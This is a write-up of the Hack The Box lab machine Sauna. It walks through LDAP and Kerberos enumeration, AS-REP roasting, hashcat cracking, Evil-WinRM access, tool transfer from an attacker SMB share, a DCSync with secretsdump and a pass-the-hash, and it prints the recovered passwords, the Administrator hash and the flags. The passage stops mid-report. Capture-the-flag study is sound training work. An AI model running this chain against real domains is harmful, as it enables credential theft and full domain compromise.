	modifiedCount: 1                                                 
	auditingPolicy:: AAE=                                                                            
	nTMixedDomain: 0                                                 
	rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                        
	fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name                                                                                                                     
	 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL         
	systemFlags: -1946157056                                         
	wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT                                                                                                                     
	 ISTICAL-BANK,DC=LOCAL                                           
	wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra                                                                                                                     
	 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL                                                             
	wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO                                                                                                                     
	 TISTICAL-BANK,DC=LOCAL                                                       
	wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin                                                                                                                     
	 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL                                          
	wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=                                                                                                                     
	 EGOTISTICAL-BANK,DC=LOCAL                                                                       
	wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E                                                                                                                     
	 GOTISTICAL-BANK,DC=LOCAL                                                     
	wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO                                                                                                                     
	 TISTICAL-BANK,DC=LOCAL                                                       
	wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC                                                                                                                     
	 AL-BANK,DC=LOCAL                                                                                
	wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,                                                                                                                     
	 DC=EGOTISTICAL-BANK,DC=LOCAL                                                 
	wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS                                                                                                                     
	 TICAL-BANK,DC=LOCAL                                                          
	wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA                                                                              
	 L-BANK,DC=LOCAL                                                                                                                                                                                   
	objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D                                                                                                                     
	 C=LOCAL                                                                      
	isCriticalSystemObject: TRUE                                                                                                                                
	gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste                                                                                                                     
	 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]                                                               
	dSCorePropagationData: 16010101000000.0Z                                                                                          
	otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS                                                                                                                     
	 TICAL-BANK,DC=LOCAL                                                                                                                                                                               
	otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic                                                                                                                     
	 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                          
	masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN                                                                                                                     
	 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL                                            
	ms-DS-MachineAccountQuota: 10                                                                    
	msDS-Behavior-Version: 7                                                                                                                                                                           
	msDS-PerUserTrustQuota: 1                                                                        
	msDS-AllUsersTrustQuota: 1000                                                                    
	msDS-PerUserTrustTombstonesQuota: 10                                                             
	msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na                                                                                                                     
	 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                         
	msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N                                                    
	 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                        
	msDS-NcType: 0                                                                                                                    
	msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE                                                                                 
	dc: EGOTISTICAL-BANK                                                                                                              
	
	# Users, EGOTISTICAL-BANK.LOCAL                                                                                                   
	dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                         
	                                                                                                                                  
	# Computers, EGOTISTICAL-BANK.LOCAL                                                                                                                                                                
	dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                      
	
	# Domain Controllers, EGOTISTICAL-BANK.LOCAL                                                                                                                                                       
	dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                             
	
	# System, EGOTISTICAL-BANK.LOCAL                                                                                                                                                                   
	dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                         
	
	# LostAndFound, EGOTISTICAL-BANK.LOCAL                                                                                                                                                             
	dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                   
	
	# Infrastructure, EGOTISTICAL-BANK.LOCAL                                                                                                                                                           
	dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                 
	
	# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL                                                                                                                                                
	dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                      
	
	# Program Data, EGOTISTICAL-BANK.LOCAL                                                                                                                                                             
	dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                   
	
	# NTDS Quotas, EGOTISTICAL-BANK.LOCAL                                                                                                                                                              
	dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                    
	
	# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL                                                                                                                                                 
	dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                       
	
	# Keys, EGOTISTICAL-BANK.LOCAL                                                                                                                                                                     
	dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                           
	
	# TPM Devices, EGOTISTICAL-BANK.LOCAL                                                                                                                                                              
	dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                    
	
	# Builtin, EGOTISTICAL-BANK.LOCAL                                                                                                                                                                  
	dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                        
	
	# Hugo Smith, EGOTISTICAL-BANK.LOCAL                                                                                                                                                               
	dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                                     
	
	# search reference                                                                                                                                                                                 
	ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST                                                                                                                     
	 ICAL-BANK,DC=LOCAL                                                                                                                                                                                
	
	# search reference                                                                                                                                                                                 
	ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST                                                                                                                     
	 ICAL-BANK,DC=LOCAL                                                                                                                                                                                
	
	# search reference                                                                                                                                                                                 
	ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC                                                                                                                     
	 AL                                                                                                                                                                                                
	
	# search result                                                                                                                                                                                    
	search: 2                                                                                                                                                                                          
	result: 0 Success                                                                                                                                                                                  
	
	# numResponses: 19                                                                                                                                                                                 
	# numEntries: 15                                                                                                                                                                                   
	# numReferences: 3                                                                       
	```

- dns 53 
	- worth trying zone transfer but no luck
	```bash
	╰─ dig axfr @10.10.10.175 sauna.htb
	
	; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.10.175 sauna.htb
	; (1 server found)
	;; global options: +cmd
	; Transfer failed.

	╰─ dig axfr @10.10.10.175 egotistical-bank.local

; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.10.175 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

-  Kerberos 88
	- using Kerbrute to enumerate users
	- create a username list from employee names from the about us page http://10.10.10.175/about.html 
		- saved under websiteUsernames.txt
		- fergus smith
		- shaun coins
		- hugo bear
		- bowie taylor
		- sophie driver
		- steven kerb
	- with username-anarchy save the expanded username list to websiteUsernamesL.txt
		- `/opt/username-anarchy-master/username-anarchy -i websiteUsernames.txt > websiteUsernamesL.txt`
		```bash
				╰─ cat websiteUsernamesL.txt                                     fergus
		fergussmith           
		fergus.smith                      
		fergussm                          
		fergsmit                          
		ferguss                           
		f.smith                           
		fsmith                            
		sfergus                           
		s.fergus                          
		smithf                            
		smith                             
		smith.f                           
		smith.fergus   
		```

	 - Run Kerburte to enumerate Kerberoastable users
	```bash
	╰─ kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL websiteUsernamesL.txt
	
	    __             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
	
	Version: v1.0.3 (9dad6e1) - 07/24/25 - Ronnie Flathers @ropnop
	
	2025/07/24 19:49:44 >  Using KDC(s):
	2025/07/24 19:49:44 >   10.10.10.175:88
	
	2025/07/24 19:49:44 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
	2025/07/24 19:49:44 >  Done! Tested 88 usernames (1 valid) in 0.277 seconds

```

	- Using The NetExec (nxc) LDAP client to perform an AS-REP roasting attack against the domain controller at 10.10.10.175 as user fsmith (with no password) and saves the resulting AS-REP hashes to fsmith-asrep.txt.
			`nxc ldap 10.10.10.175 -u fsmith -p '' --asreproast fsmith-asrep.txt
		- nxc – the NetExec CLI binary
		- ldap – tells NetExec you’re targeting the LDAP service on the DC
		- 10.10.10.175 – the IP of the domain controller
		- -u fsmith – username flag (we’re impersonating fsmith)
		- -p '' – password flag (empty string, since ASREProast abuses accounts without valid passwords)
		- --asreproast – invoke the ASREProast module to fetch AS-REP hashes
		- fsmith-asrep.txt – file where the dumped hashes will be saved

		```bash
		╰─ cat fsmith-asrep.txt 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6d4fbf3f8a781406151d2659ae264aa2$9f2678932889aa9e140cae90925bb3ba4eeb1ef809dad470ffdeed7c7bb7763d45a530f9ba832760d6a9e8efbe1a7242bde2711d664539ac19aaca939be6086cad757c86bfec3ff22b614da8e1ee894d305b3d1c091e47ea4e01cc0f54a6ffd23a8774904e9823d943a5942bce4bb90789f2d9ddac6ffaec481a6806e8b0a6d9f2de0834c9a59671bc82c054ec390470dfef91c01261aa652f294e4ac000b71aa6ae7323b1eba14b099ecb2ee5c93c33e5ccec21fcf146b8beeae35695db39af3385064bd691c5a1655514489ac4cca95067524c492b6b3264ce19ea4f6395461eea59eb7dad4557a8349937897c029c247400a15db5b578006ea763ef3a8028
		```

	- Now that we have a hash for the user fsmith we can attempt to crack it with hashcat. 
		- `hashcat -m 18200 fsmith-asrep.txt /usr/share/wordlists/rockyou.txt --force`
		- hashcat: the cracking engine
		- -m 18200: tells hashcat “I’m cracking Kerberos 5 AS‑REP hashes”
		- fsmith-asrep.txt: your file with the single $krb5asrep$… hash
		- /usr/share/wordlists/rockyou.txt: the password list hashcat will iterate through
		- --force: forces hashcat to run even if it warns about potential performance or compatibility problems
		- hashcat reveals the cracked hash of Thestrokes 23
	```bash
	╰─ hashcat -m 18200 fsmith-asrep.txt /usr/share/wordlists/rockyou.txt --force                                                    
hashcat (v6.2.6) starting                                                
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6d4fbf3f8a781406151d2659ae264aa2$9f2678932889aa9e140cae90925bb3ba4eeb1ef809dad470ffde
ed7c7bb7763d45a530f9ba832760d6a9e8efbe1a7242bde2711d664539ac19aaca939be6086cad757c86bfec3ff22b614da8e1ee894d305b3d1c091e47ea4e01c
c0f54a6ffd23a8774904e9823d943a5942bce4bb90789f2d9ddac6ffaec481a6806e8b0a6d9f2de0834c9a59671bc82c054ec390470dfef91c01261aa652f294e
4ac000b71aa6ae7323b1eba14b099ecb2ee5c93c33e5ccec21fcf146b8beeae35695db39af3385064bd691c5a1655514489ac4cca95067524c492b6b3264ce19e
a4f6395461eea59eb7dad4557a8349937897c029c247400a15db5b578006ea763ef3a8028:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6d4fbf3...3a8028
Time.Started.....: Wed Jul 30 17:14:37 2025, (10 secs)
Time.Estimated...: Wed Jul 30 17:14:47 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1034.4 kH/s (1.42ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid

Started: Wed Jul 30 17:14:08 2025
Stopped: Wed Jul 30 17:14:49 2025
	```

	- Now that we have the password for fsmith of Thestrokes23 Let's use it with Evil-WinRM
	```bash
	╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  12:09:59 PM  
╰─ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 
Evil-WinRM shell v3.7   
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline 
                                                                                                                                 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion            
                                                                                                                                 
Info: Establishing connection to remote endpoint                                                           *Evil-WinRM* PS C:\Users\FSmith\Documents> dir
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir

    Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   8:41 PM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1cf802e519c0437929c018fefa822a70

```

	 - copy winPEASx64.exe from /usr/share/peass/winpeas to /htb/sauna
	 ```bash
╭─ ~/htb/sauna 02:49:44 PM  
╰─ winpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE
                         
/usr/share/peass/winpeas
├── winPEASany.exe
├── winPEASany_ofs.exe
├── winPEAS.bat
├── winPEASx64.exe
├── winPEASx64_ofs.exe
├── winPEASx86.exe
└── winPEASx86_ofs.exe

╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:50:09 PM 
╰─ cp winPEASx64.exe ~/htb/sauna/     
╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:50:21 PM 
╰─ ls
winPEASany.exe  winPEASany_ofs.exe  winPEAS.bat  winPEASx64.exe  winPEASx64_ofs.exe  winPEASx86.exe  winPEASx86_ofs.exe
╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:53:43 PM 
╰─ exit
╭─ ~/htb/sauna 
▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  3m 37s  02:53:46 PM 
╰─ ls
fsmith-asrep.txt  sauna_services.gnmap  SaunaServicesVersions.txt  sauna_winpeas_fast     websiteUsernames.txt nmapSauna.txt     sauna_services.nmap   sauna_services.xml         websiteUsernamesL.txt  winPEASx64.exe

```


	- Downloading WinPEAS from kali attack machine to Windows target machine
	- on kali vm for window machine to connect to and pull down winpeas
	- On Kali attack machine set up smb share 
		 `╭─ ~/htb/sauna ▓▒░─────────────────────────────────────░▒▓ INT ✘  11m 58s  02:28:02 PM  
		 `╰─ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username df -password df share . -smb2support`
	- On Windows connect to the kali smb share and cd into share
		`\\10.10.14.16\share> net use \\10.10.14.16\share df /user:df`
		`cd \\10.10.14.16\share\`
	 - Running WinPEAS to enumerate the Windows machine
		 - reveals autologon creds svc_loanmanager / Moneymakestheworldgoround!
	 - Running net user reveals a user by the name svc_loanmgr
	 ```bash
	*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\winPEASx64.exe

	...

	 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials 
    Some AutoLogon credentials were found       
    DefaultDomainName             :  EGOTISTICALBANK 
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

   *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> net user
	User accounts for \\
	-------------------------------------------------------------------------------
	Administrator            FSmith                   Guest
	HSmith                   krbtgt                   svc_loanmgr
	The command completed with one or more errors.

	```

	- logging into svc_loanmgr and rooting around files reveals nothing
	- running WinPEAS on svc_loanmgr reveals nothing

	- copying SharpHound.exe from install location to /htb/sauna
		- `cp /usr/share/sharphound/SharpHound.exe /htb/sauna

	- pull Sharphound from kali smb share to windows 
		- `*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\SharpHound.exe`

	- upload zip from sharphound output to bloodhound

	-  identified connection from svc_loanmgr has DCSync permissions with connect to domain admin
	- ![[Pasted image 20250801174912.png]]

	- Can perform a dcsync attack with impacket-secrets dump 
```bash
╭─ ~/htb/sauna ▓▒░────────────────────────────────────────────────────────────░▒▓ ✔  1m 1s  04:40:01 PM                    
╰─ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)     
[*] Using the DRSUAPI method to get NTDS.DIT secrets        
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::     
```

 - now we can pash the hash with evil-winrm
	 - signed in as administrator and pull the root flag
 ```bash
 ╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────░▒▓ 127 ✘  05:32:03 PM 
╰─ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> username
The term 'username' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ username
+ ~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (username:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   8:41 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
73b6893a471e3977b74e466e8f455d1d
```

---





**Machine Name:** Sauna  
**URL:** https://app.hackthebox.com/machines/sauna  
**Difficulty:** Medium  
**Release Date:** 2023-04-11  # adjust if needed  
**Retired:** Yes  
**IP Address:** 10.10.10.175  
**Operating System:** Windows  

---

## 📋 Executive Summary

- **Objective:** Achieve complete system compromise and obtain both user and Administrator flags.  
- **Attack Vector:** Kerberos AS-REP roasting to recover credentials → initial access via Evil-WinRM → discovery of AutoLogon credentials via WinPEAS → Active Directory graph analysis with BloodHound revealing DCSync capability → DCSync attack to extract Administrator hash → pass-the-hash for full domain takeover.  
- **Key Vulnerabilities:**  
  1. Kerberos account without preauthentication (AS-REP roast).  
  2. Exposed AutoLogon credentials stored in plaintext.  
  3. Over-privileged service account with DCSync rights enabling domain replication abuse.  
- **Impact:** Critical – Full domain compromise, including domain administrator access.  
- **Business Impact:** Unauthorized access to all directory/data, credential theft, identity impersonation, potential persistence/backdoor insertion, full system control.

---

## 🔎 Reconnaissance & Enumeration

### Network Scan

Initial full port scan followed by service discovery:

```bash
╭─ ~/htb/sauna▒░─────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  03:39:04 PM                                                                             
╰─ nmap -p- -T4 --open -Pn -vvv 10.10.10.175 -oN nmapSauna.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 15:50 EDT
...
PORT      STATE SERVICE          REASON                                       
53/tcp    open  domain           syn-ack ttl 127                              
80/tcp    open  http             syn-ack ttl 127                              
88/tcp    open  kerberos-sec     syn-ack ttl 127                              
135/tcp   open  msrpc            syn-ack ttl 127                              
139/tcp   open  netbios-ssn      syn-ack ttl 127                              
389/tcp   open  ldap             syn-ack ttl 127                              
445/tcp   open  microsoft-ds     syn-ack ttl 127                              
464/tcp   open  kpasswd5         syn-ack ttl 127                              
593/tcp   open  http-rpc-epmap   syn-ack ttl 127                              
636/tcp   open  ldapssl          syn-ack ttl 127                              
3268/tcp  open  globalcatLDAP    syn-ack ttl 127                              
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127                              
5985/tcp  open  wsman            syn-ack ttl 127                              
9389/tcp  open  adws             syn-ack ttl 127                              
49667/tcp open  unknown          syn-ack ttl 127                              
49673/tcp open  unknown          syn-ack ttl 127                              
49674/tcp open  unknown          syn-ack ttl 127                              
49677/tcp open  unknown          syn-ack ttl 127                              
49689/tcp open  unknown          syn-ack ttl 127                              
49696/tcp open  unknown          syn-ack ttl 127  
````

**Key Findings:**

- Exposed Active Directory ecosystem: LDAP, Kerberos, SMB, WinRM, AD Web Services, Global Catalog, etc.
    
- Web service on port 80 with content that can be used for user enumeration.
    
- No anonymous SMB share access (authentication required).
    

---

## 🌐 Web Application Analysis

### Directory Enumeration

```bash
╰─ dirsearch -u http://10.10.10.175
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/b7h30/reports/http_10.10.10.175/_25-07-24_16-54-09.txt

Target: http://10.10.10.175/

[16:54:09] Starting: 
[16:54:10] 403 -  312B  - /%2e%2e//google.com                               
[16:54:10] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[16:54:13] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:54:14] 200 -   30KB - /about.html                                       
[16:54:21] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[16:54:23] 200 -   15KB - /contact.html                                     
[16:54:23] 301 -  147B  - /css  ->  http://10.10.10.175/css/                
[16:54:26] 301 -  149B  - /fonts  ->  http://10.10.10.175/fonts/            
[16:54:28] 403 -    1KB - /images/                                          
[16:54:28] 301 -  150B  - /images  ->  http://10.10.10.175/images/          
Task Completed
```

**Discovered Endpoints:**

- `/about.html` – 200 OK; source of employee names used for username enumeration.
    
- `/contact.html` – 200 OK.
    
- Path traversal attempts (e.g., to `/etc/passwd`) were blocked (403).
    

### Technology Stack:

- **Web Server:** Not explicitly fingerprinted (static content).
    
- **Application:** Static HTML pages (used for information harvesting).
    
- **CMS/Framework:** None identified.
    

---

## 🚨 Vulnerability Analysis

### 1. Kerberos AS-REP Roast (No Preauthentication)

**Description:** The account `fsmith` had preauthentication disabled, allowing an AS-REP to be requested and cracked offline to retrieve the password.

**Risk Assessment:**

- **Severity:** High
    
- **Attack Vector:** Network (Kerberos)
    
- **Authentication Required:** No preauth needed
    
- **User Interaction:** None
    

**Exploitation:**

- Enumerated usernames via expansion from web-sourced names.
    
- Valid user discovered with `kerbrute`.
    
- AS-REP hash for `fsmith` requested and cracked with `hashcat`.
    

Raw username list sample used:

```bash
╰─ cat websiteUsernamesL.txt
fergus
fergussmith
fergus.smith
...
smith.fergus
```

Kerberos enumeration:

```bash
╰─ kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL websiteUsernamesL.txt
[+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

AS-REP hash retrieved:

```bash
╰─ cat fsmith-asrep.txt 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:... (hash truncated)
```

Cracked with Hashcat:

```bash
╰─ hashcat -m 18200 fsmith-asrep.txt /usr/share/wordlists/rockyou.txt --force
...
Recovered........: 1/1 (100.00%)
...:Thestrokes23
```

**Credential Obtained:** `fsmith:Thestrokes23`

---

### 2. Exposed AutoLogon Credentials

**Description:** After initial access as `fsmith`, WinPEAS revealed AutoLogon credentials in plaintext for `svc_loanmanager`.

**Risk Assessment:**

- **Severity:** High
    
- **Impact:** Credential reuse escalation
    
- **Root Cause:** Misconfigured AutoLogon storing credentials insecurely
    

Output snippet from WinPEAS:

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials 
Some AutoLogon credentials were found       
DefaultDomainName             :  EGOTISTICALBANK 
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```

---

### 3. DCSync via Excessive Privileges

**Description:** The service account (`svc_loanmgr` or `svc_loanmanager`) had DCSync permissions, enabling replication-style extraction of secrets from AD, including the Administrator NTLM hash.

**Risk Assessment:**

- **Severity:** Critical
    
- **Impact:** Full domain compromise
    
- **Root Cause:** Over-privileged account ACLs
    

Attack execution:

```bash
╭─ ~/htb/sauna ▓▒░────────────────────────────────────────────────────────────░▒▓ ✔  04:40:01 PM                    
╰─ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'                   
...
Administrator:500:...:823452073d75b9d1cf70ebdf86c7f98e:::
```

**Result:** Administrator NTLM hash obtained: `823452073d75b9d1cf70ebdf86c7f98e`

---

## 🔓 Initial Access

### Exploitation Method

**Primary Vulnerability:** Kerberos AS-REP roast on user `fsmith`.

**Steps:**

1. Harvested names from web content and generated username variants.
    
2. Enumerated valid Kerberos users with `kerbrute`.
    
3. Retrieved AS-REP hash for `fsmith` and cracked it with `hashcat`.
    
4. Logged in using `evil-winrm` with recovered credentials.
    

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

**Result:**

- **Initial Access:** Achieved as user `fsmith`
    
- **User Flag Retrieved:**
    
    ```bash
    cat C:\Users\FSmith\Desktop\user.txt
    1cf802e519c0437929c018fefa822a70
    ```
    

---

## 🔍 Post-Exploitation Enumeration

### LDAP / AD Enumeration

Pulled domain naming contexts:

```bash
╰─ ldapsearch -x -H ldap://sauna.htb -s base namingcontexts
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
...
```

Full domain subtree enumeration:

```bash
╰─ ldapsearch -x -H ldap://sauna.htb -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
[Very verbose LDAP output showing domain object, containers (Users, Computers, Domain Controllers), wellKnownObjects, and other metadata]
```

**Action:** Added `egotistical-bank.local` and `sauna.egotistical-bank.local` to `/etc/hosts` for resolution.

---

### SMB Share for Tooling

Set up SMB server on attack machine to host tools like `winPEASx64.exe` and `SharpHound.exe`:

```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username df -password df share . -smb2support
```

Connected from target to pull tools:

```powershell
net use \\10.10.14.16\share df /user:df
cd \\10.10.14.16\share\
```

---

## 🚀 Privilege Escalation

### WinPEAS Execution

Copied winPEAS to working directory and executed it via SMB share:

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe ~/htb/sauna/
```

On the target:

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\winPEASx64.exe
```

Revealed AutoLogon credentials for `svc_loanmanager`.

### BloodHound Collection

Copied `SharpHound.exe`:

```bash
cp /usr/share/sharphound/SharpHound.exe /htb/sauna
```

Executed on target to gather graph data:

```powershell
.\SharpHound.exe
```

Analyzed output in BloodHound to identify that `svc_loanmgr` had DCSync rights and a path to Domain Admin.

### DCSync & Pass-the-Hash

Performed DCSync:

```bash
impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'
```

Used Administrator hash for pass-the-hash login:

```bash
evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

Retrieved root flag:

```powershell
